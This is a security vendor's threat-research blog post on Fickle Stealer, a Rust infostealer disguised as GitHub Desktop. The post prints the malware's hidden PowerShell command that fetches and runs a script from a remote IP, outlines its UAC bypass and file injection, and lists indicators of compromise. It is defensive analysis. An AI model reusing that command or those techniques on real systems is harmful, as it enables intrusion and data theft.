@@ -1,0 +1,753 @@
+New Stealer Uses Invalid Cert To Compromise Systems
+Breached?
+Support
+CISO
+Contact
+Login
+Trellix Login
+Trellix Hive
+Developer Portal
+Marketplace
+Search
+Search
+Clear
+|
+Search Tips
+Quick Links
+Why Trellix?
+|
+Products
+|
+Advanced Research Center
+|
+Newsroom
+|
+Blogs
+Change Language
+Australia (English)
+Brasil (Português)
+Canada (English)
+Canada (Français)
+Deutschland (Deutsch)
+España (Español)
+France (Français)
+Hong Kong (English)
+India (English)
+Italia (Italiano)
+日本 (日本語)
+대한민국 (한국어)
+México (Español)
+Singapore (English)
+United Kingdom (English)
+United States (English)
+Why Trellix?
+Platform
+Services
+Partners
+Resources
+About
+Why Trellix?
+Why Trellix?
+Why Trellix is the best choice in cybersecurity
+Trellix vs. CrowdStrike
+Transparency, choice, and responsibility
+Trellix Platform Advantage
+Discover the benefits of the Trellix platform
+Threat Intelligence
+Advanced Research Center
+Explore the latest in cybersecurity research
+Trellix Insights
+Get the latest insights from our experts
+Threat Reports
+Stay ahead of the latest threats
+Latest Research Blogs
+Read the latest research from our experts
+No Alert Left Behind Challenge
+Take the Trellix Challenge and find out how to investigate 100% of your alerts using GenAI
+Platform Capabilities
+About Our Platform
+Learn about our AI-powered security platform
+Trellix Wise
+Investigate 100% of alerts with GenAI
+Engine
+AI-powered context; respond in minutes
+Product Categories
+Endpoint Security
+Data Security
+Network Security
+Threat Intelligence
+Email Security
+Cloud Security
+SIEM
+View All Products
+Solutions
+Ransomware Detection and Response
+Zero Trust Strategy
+AI and Security Operations
+CISO
+Government
+Election Security
+Professional Services
+Trellix Thrive
+Solution Services
+Cyber Consulting Services
+Education And Training
+Education Services
+Training Courses
+Trellix Thrive
+Make the most of your investment in Trellix’s industry-leading cybersecurity technologies
+Partners
+Partners Overview
+Security Innovation Alliance
+OEM & Embedded Alliances
+Amazon Web Services (AWS)
+Google Cloud
+Telefónica Tech
+Partner Portal
+Trellix Hive Login
+Become a Partner
+Managed Detection And Response
+Managed Detection and Response Services
+What is Managed Detection and Response?
+Resource Center
+Resource Library
+Customer Stories
+Security Awareness Topics
+Learn
+Webinars
+Weekly Tech Talk Series
+Product Tours
+Weekly Tech Talk Series
+Join Trellix technical experts in a weekly 30-minute tech talk webinar series
+Company
+About Trellix
+Leadership
+Industry Recognition
+Customer Stories
+Careers
+Media
+Press Releases
+Latest News
+Blogs
+View Newsroom
+Connect
+Events
+Contact Us
+Get Started
+Menu
+Why Trellix?
+Platform
+Services
+Partners
+Resources
+About
+Get Started
+Breached?
+Support
+Contact Us
+Main menu
+WHY TRELLIX?
+Why Trellix?
+Trellix vs. CrowdStrike
+Trellix Platform Advantage
+THREAT INTELLIGENCE
+Advanced Research Center
+Trellix Insights
+Threat Reports
+Latest Research Blogs
+Main menu
+PLATFORM CAPABILITIES
+About Our Platform
+Trellix Wise
+Engine
+PRODUCT CATEGORIES
+Endpoint Security
+Data Security
+Network Security
+Threat Intelligence
+Email Security
+Cloud Security
+SIEM
+View All Products
+SOLUTIONS
+Ransomware Detection and Response
+Zero Trust Strategy
+AI and Security Operations
+CISO
+Government
+Election Security
+Main menu
+PROFESSIONAL SERVICES
+Trellix Thrive
+Solution Services
+Cyber Consulting Services
+EDUCATION AND TRAINING
+Education Services
+Training Courses
+Main menu
+PARTNERS
+Partners Overview
+Security Innovation Alliance
+OEM & Embedded Alliances
+Amazon Web Services (AWS)
+Google Cloud
+Telefónica Tech
+PARTNER PORTAL
+Trellix Hive Login
+Become a Partner
+MDR RESOURCES
+Managed Detection and Response Services
+What is Managed Detection and Response?
+Main menu
+RESOURCE CENTER
+Resource Library
+Customer Stories
+Security Awareness Topics
+LEARN
+Webinars
+Weekly Tech Talk Series
+Product Tours
+LOGIN
+Trellix Login
+Trellix Hive
+Developer Portal
+Marketplace
+Main menu
+COMPANY
+About Us
+Leadership
+Industry Recognition
+Customer Stories
+Careers
+MEDIA
+Press Releases
+Latest News
+Blogs
+View Newsroom
+CONNECT
+Events
+Contact Us
+Take a Product Tour
+Request a Demo
+Cybersecurity Assessment
+Contact Us
+Blogs
+The latest cybersecurity trends, best practices, security vulnerabilities, and more
+Subscribe
+Stay updated
+*
+Business Email
+*
+Country
+Select...
+Taiwan
+Afghanistan
+Aland Islands
+Albania
+Algeria
+Andorra
+Angola
+Anguilla
+Antarctica
+Antigua/Barbuda
+Argentina
+Armenia
+Aruba
+Australia
+Austria
+Azerbaijan
+Bahamas
+Bahrain
+Bangladesh
+Barbados
+Belarus
+Belgium
+Belize
+Benin
+Bermuda
+Bhutan
+Bolivia
+Bonaire
+Bosnia-Herz.
+Botswana
+Bouvet Island
+Brazil
+Brit.Ind.Oc.Ter
+Brunei Darussalam
+Bulgaria
+Burkina-Faso
+Burundi
+Cambodia
+Cameroon
+Canada
+Cape Verde
+Cayman Islands
+Central African Republic
+Chad
+Chile
+China
+Christmas Island
+Coconut Islands
+Colombia
+Comoros
+Congo
+Cook Islands
+Costa Rica
+Ivory Coast
+Croatia
+Cuba
+Curacao
+Cyprus
+Czech Republic
+Denmark
+Djibouti
+Dominica
+Dominican Republic
+East Timor
+Ecuador
+Egypt
+El Salvador
+Equatorial Guinea
+Eritrea
+Estonia
+Ethiopia
+Falkland Islnds
+Faroe Islands
+Fiji
+Finland
+France
+French Guiana
+French Polynesia
+French Southern Territories
+Gabon
+Gambia
+Georgia
+Germany
+Ghana
+Gibraltar
+Greece
+Greenland
+Grenada
+Guadeloupe
+Guam
+Guatemala
+Guernsey
+Guinea
+Guinea-Bissau
+Guyana
+Haiti
+Heard and Mc Donald Islands
+Vatican City
+Honduras
+Hong Kong
+Hungary
+Iceland
+Slovenia
+India
+Indonesia
+Iraq
+Ireland
+Isle of Man
+Israel
+Italy
+Jamaica
+Japan
+Jersey
+Jordan
+Kazakhstan
+Kenya
+Kiribati
+Kosovo
+Kuwait
+Kyrgyzstan
+Laos
+Latvia
+Lebanon
+Lesotho
+Liberia
+Libya
+Liechtenstein
+Lithuania
+Luxembourg
+Macau
+Madagascar
+Malawi
+Malaysia
+Maldives
+Mali
+Malta
+Marshall Islnds
+Martinique
+Mauritania
+Mauritius
+Mayotte
+Mexico
+Micronesia
+Moldova
+Monaco
+Mongolia
+Montenegro
+Montserrat
+Morocco
+Mozambique
+Myanmar
+Namibia
+Nauru
+Nepal
+Netherlands
+Netherlands Antilles
+New Caledonia
+New Zealand
+Nicaragua
+Niger
+Nigeria
+Niue Islands
+Norfolk Island
+N.Mariana Islnd
+Macedonia
+North Macedonia
+Norway
+Oman
+Pakistan
+Palau
+Palestine State
+Panama
+Papua New Guinea
+Paraguay
+Peru
+Philippines
+Pitcairn Islnds
+Poland
+Portugal
+Puerto Rico
+Qatar
+Reunion
+Romania
+Russian Federation
+Rwanda
+St. Barthelemy
+St. Helena
+Saint Kitts and Nevis
+St. Lucia
+St. Martin
+St. Pierre and Miquelon
+St. Vincent
+Samoa American
+San Marino
+Sao Tome and Principe
+Saudi Arabia
+Senegal
+Serbia
+Seychelles
+Sierra Leone
+Singapore
+Sint Maarten
+Slovak Republic
+Solomon Islands
+Somalia
+South Africa
+S. Sandwich Islands
+South Korea
+South Sudan
+Spain
+Sri Lanka
+Sudan
+Suriname
+Svalbard
+Swaziland
+Sweden
+Switzerland
+Syria
+Tajikistan
+Tanzania
+Thailand
+Timor-Leste
+Togo
+Tokelau Islands
+Tonga
+Trinidad and Tobago
+Tunisia
+Turkey
+Turkmenistan
+Turks and Caicos Islands
+Tuvalu
+Uganda
+Ukraine
+United Arab Emirates
+United Kingdom
+United States
+United States Minor Outlying
+Uruguay
+Uzbekistan
+Vanuatu
+Venezuela
+Vietnam
+Virgin Islands British
+Virgin Islands U.S.
+Wallis and Futuna Islands
+Western Sahara
+Western Samoa
+Yemen
+Zambia
+Zimbabwe
+Yes, I'd like to receive communications from Trellix and Skyhigh Security. See our
+Privacy Policy
+for information on how we use and protect your data. You can always change your preferences on our
+subscription center
+.
+Submit
+OTP Validation
+Please check your email for a one-time-password. The password expires in 10
+                minutes.
+One-Time-Password
+Please enter OTP.
+Submit
+Resend OTP
+<<
+Blogs:
+XDR
+Research
+Perspectives
+ARIA Resort & Casino | Las Vegas
+September 27-29, 2022
+Register Now
+Learn More
+New Stealer Uses Invalid Cert To Compromise Systems
+By
+Mallikarjun Wali
+and
+Sangram Mohapatro
+· November 07, 2024
+A new Stealer has been making the rounds. Its name:
+Fickle
+. Fickle Stealer is a new Rust-based information stealer that spreads through various attack vectors, including phishing (malicious attachments), drive-by downloads, exploit kits, and social engineering. It has been detected in multiple file formats, such as Microsoft Word documents, executables, and LNK files. The malware utilizes a PowerShell script to bypass User Account Control (UAC) and is capable of stealing sensitive files, system information, browser-stored data, cryptocurrency wallet details, and more.
+It is a type of harmful stealer malware, written in the Rust programming language and designed to steal sensitive information from devices. It can collect data like usernames, passwords, browsing history, credit card details, and more from web browsers and other applications. Fickle avoids detection by security programs and can download files, take screenshots, and even delete itself after displaying a fake error message - making it particularly nefarious.
+Fickle Stealer emerged in May 2024 and we have seen it infect systems in various ways including drive-by download, files purporting to be clean apps, ransomware infections, and even using invalid certificates.Once delivered, Fickle Stealer employs a series of preparatory actions to establish persistence and bypass security measures, such as User Account Control (UAC). This allows it to execute its primary function: stealing sensitive information from compromised systems.
+In this particular blog , we will describe Fickle, this new stealer which masquerades as GitHub Desktop for Windows and uses an invalid digital signature. The malicious file has a Digital Signature signed by “GitHub, Inc.” and counter signed by “Microsoft Public RSA Time Stamping Authority” in an attempt to appear to be legitimate.
+File Properties
+Figure 1: GitHub Desktop File Metadata
+Digital Signature Details:
+Figure 2: Invalid Digital signature Details
+From the above image we can see that the file is spoofing itself as a GitHub Desktop application and also has an invalid digital signature which is signed by “GitHub Inc”.
+Background on the Stealer:
+Fickle Stealer employs a multi-stage attack chain, which makes detection and mitigation particularly difficult. Its distribution utilizes various techniques, including VBA droppers and downloaders that take advantage of vulnerabilities in Microsoft Windows systems.
+A key feature of Fickle Stealer is its use of a custom packer to obfuscate its malicious code, masking it as legitimate executable files. This tactic complicates static analysis and undermines traditional detection methods. Additionally, the malware's payload is designed for stealth, employing anti-analysis techniques to escape sandbox environments and debugging tools. By generating misleading error messages and checking for indicators of analysis, Fickle Stealer successfully evades detection while extracting valuable data from compromised machines.
+Analysis of the Stealer:
+On analyzing the file there are strings which seem to be a command with arguments, but many characters appear altered or jumbled.
+Figure 3: Jumbled string of file from BinText
+Rh[.]ps1hss\uhbypah245\h208[.]h213[.]h185[.]h "\\hFilehss -hBypahicy hnPolhutiohExechen -hhiddhwin hop -he -nhl.exhshelhowerh/c phcmd TYRQd
+The above strings look like it’s using PowerShell file and executing it, and there is also a IP domain
+245\h208[.]h213[.]h185[.]h
+>, which looks like a C2(command and control) domain.
+Using the debugger, we can see the above string in readable format.
+Figure 4: Readable string seen from windbg
+The strings below can be seen during debugging.
+"cmd /c powershell.exe -nop -win hidden -ExecutionPolicy Bypass -File \"\\\\185[.]213[.]208[.]245\\bypass\\u.ps1"
+cmd /c
+:
+Executes the command specified by the string and then terminates.
+powershell.exe
+:
+Calls PowerShell.
+-nop
+:
+No profile; starts PowerShell without loading the user profile.
+-win hidden
+:
+Runs the PowerShell window hidden.
+-ExecutionPolicy Bypass
+:
+Temporarily allows the execution of scripts, bypassing the normal execution policy.
+-File
+:
+Specifies the script file to execute.
+Information on the payloads :
+The PowerShell script, as "bypass.ps1" or "u.ps1," is intended to regularly transmit details about the victim, such as their country, city, IP address, operating system version, computer name, and username, to a Telegram bot managed by the attacker.
+u.ps1:
+The main goal of this script is to bypass User Account Control (UAC) and run Fickle Stealer. It also sets up a new task to execute engine.ps1. To achieve UAC bypass, u.ps1 deploys both a legitimate copy of WmiMgmt.msc and a counterfeit version.
+engine.ps1:
+It scans for executable files in the directories C:\Users, D:, E:, and F:. When it finds a file, it runs inject.ps1 to inject shell code, which executes u.ps1 from the internet. The paths of the injected files are base64 encoded and stored in C:\Users\Public\prepares.dat. Prior to injection, engine.ps1 checks the list to avoid double injection.
+Figure 5: Attack flow
+Analysis of the payload:
+On execution of the file, the file(MD5:C3C7DAA897ABEB907AEB13250E882FE5) is executing and terminating itself.
+Figure 6: Process Tree after execution of file
+But on checking the process Tree, its opening powershell.exe,
+Figure 7: Properties of Powershell child process which is using cmd to connect (C&C)
+Checking the properties of powershell.exe, it’s using the command.
+"cmd /c powershell[.]exe -nop -win hidden -ExecutionPolicy Bypass -File \\\\\185[.]213[.]208[.]245\\bypass\\u[.]ps1
+Summary:
+The file is type of malware related to Fickle Stealer which upon executing, tries to connect to the 185[.]213[.]208[.]245 and downloads the payload, using a PowerShell script to bypass User Account Control (UAC) and execute Fickle Stealer.
+To verify if the certificate is valid or not we can use the sigcheck tool.
+Figure 8: Digital signature details using sigcheck tool
+References:
+Fickle Stealer Distributed via Multiple Attack Chain | FortiGuard Labs (fortinet.com)
+New Rust-based Fickle Malware Uses PowerShell for UAC Bypass and Data Exfiltration (thehackernews.com)
+File Information:
+SHA256:
+4c930e2ed4f44cacfe5a5938c446f0973a31b0969d399dacbf6c2625aa72b812
+MD5:
+C3C7DAA897ABEB907AEB13250E882FE5
+File Name:
+GitHub Desktop
+Company Name:
+GitHub,
+>Inc
+.
+Icon:
+Indicator of Compromise(IOCs):
+The below Payloads are Communicating Files to
+185[.]213[.]208[.]245\\bypass\\u.ps1
+022bf939e575b38578560fbba65a4cbebc43e5fbb54983fc845dbbc81420ff7c - Dctooux.exe
+2105c78e2d975be2e83f16eaaa4120aba22e19e37ba1c8aedabd6922725b3f99 - meLabsReg.exe
+4291bad1e35d8a8cdd7c9f5d1bdfdc0e9a1f1c956f9d348a3a068f2c854f54b1 - PLCPASS.exe
+7f5765e368b5ee21568b1d208cad821f01d8c1520ff7789529494db69d45c257 - Bootstrapper.exe
+2357bdb0f5b32ad86c8b0b6ae44ae8e47eb17327f1aac400b971b95e8648edd0 - AnyDesk.exe
+U.ps1:
+47e4142fa6ab10a2d7dc0423d41f9bdbb3ced0f4fae5c58b673386d11dd8c973
+94ee2227696da3049ff67592834b4b6f98186f91e6d1cd1eeec44f24b9df754b
+engine.ps1:
+f080d7803ce1a1b9dc72da6ddf0dd17e23eb8227c497f09aa7dfd6f3b5be3a66
+Trellix ENS Detections signatures for the IoCs:
+PS/Agent.jk
+Generic Obfuscated.g
+Trojan-FWZD
+WebSite:
+hxxp://185[.]213[.]208[.]245
+The site is marked as “Malicious Sites” ,”Phishing” High Risk by Skyhigh security in
+https://trustedsource.org/
+RECENT NEWS
+Nov 7, 2024
+Trellix Achieves FedRAMP® High Authorization to Protect U.S. Government from Growing Cyber Threats
+Oct 15, 2024
+Trellix Finds Nearly Half of CISOs to Exit the Role Without Industry Action
+Oct 3, 2024
+Trellix CEO Rallies the Industry to Support CISO Role
+Sep 10, 2024
+Trellix Integrates Email Security with Data Loss Prevention
+Aug 21, 2024
+U.S. Department of Defense Chooses Trellix to Protect Millions of Email Systems from Zero-Day Threats
+RECENT STORIES
+2024年11月7日
+New Stealer Uses Invalid Cert To Compromise Systems
+2024年11月7日
+Trellix Celebrates and Honors Our Veterans
+2024年10月30日
+MacOS Malware Surges as Corporate Usage Grows
+2024年10月23日
+CISOs at the Crossroads: A Call for Support and Change
+2024年10月17日
+Shrinking the Gray with Modern Endpoint Security
+The latest from our newsroom
+Blogs
+| Research
+MacOS Malware Surges as Corporate Usage Grows
+By
+Ilya Kolmanovich
+,
+Prashant Kadam
+,
+Duy-Phuc Pham
+,
+Max Kersten
+and
+Joe Malenfant
+· October 30, 2024
+As more companies adopt macOS for their corporate needs, attackers are adapting their techniques to get what they want.
+Read the Article
+Blogs
+| XDR
+No Alert Left Behind - Get to 100% with GenAI
+By
+Brian B. Brown
+· October 3, 2024
+GenAI solves two of cybersecurity’s biggest challenges: alert fatigue and advanced threats. Learn how Trellix Wise GenAI capabilities make it possible to get to 100% alert investigation and leave no alert behind.
+Read the Article
+Blogs
+| Perspectives
+Cyber Threats Targeting the US Government During the Democratic National Convention
+By
+Anne An
+· October 2, 2024
+Trellix global sensors detected a spike in threats targeting US government bodies, election boards, law enforcement, and transit networks during the August 2024 DNC.
+Read the Article
+Featured Content
+Get the latest
+We’re no strangers to cybersecurity. But we are a new company.
+Stay up to date as we evolve.
+Please enter a valid email address.
+Please enter a business email address
+Submit
+Zero spam. Unsubscribe at any time.
+Platform Capabilities
+The Trellix Platform
+Trellix Wise
+Engine
+Product Categories
+Endpoint Security
+Data Security
+Network Security
+Threat Intelligence
+Email Security
+Cloud Security
+SIEM
+View All Products
+About Trellix
+Why Trellix?
+About Us
+Leadership
+Partners
+Careers at Trellix
+Corporate Social Responsibility
+News and Events
+Newsroom
+Press Releases
+Blogs
+Webinars
+Events
+Support
+Support
+Product Documentation
+Downloads
+Product End-of-Life
+Communication Preferences
+Resources
+Resource Library
+Advanced Research Center
+Training and Education
+Security Awareness
+Trust Center
+Self-Guided Tours
+Connect with Trellix
+Contact Us
+Request a Demo
+Trellix Store
+Shop Online
+Copyright ©
+2024
+Musarubra US LLC
+|
+Privacy
+|
+Legal
+|
+Terms of Service
+Search Tips
+Be concise and specific:
+Wrong:
+I want to learn how to migrate to Trellix Endpoint Security
+Right:
+Trellix Endpoint Security migration
+Use quotation marks to find a specific phrase:
+“migrate to Trellix Endpoint security”
+Use sets of quotation marks to search for multiple queries:
+“endpoint security” “Windows”
+Punctuation and special characters are ignored:
+Avoid these characters: `, ~, :, @, #, $, %, ^, &, =, +, <, >, (, )
+The search engine is not case sensitive:
+Endpoint security
+,
+endpoint security
+, and
+ENDPOINT SECURITY
+will all yield the same results.
+Close
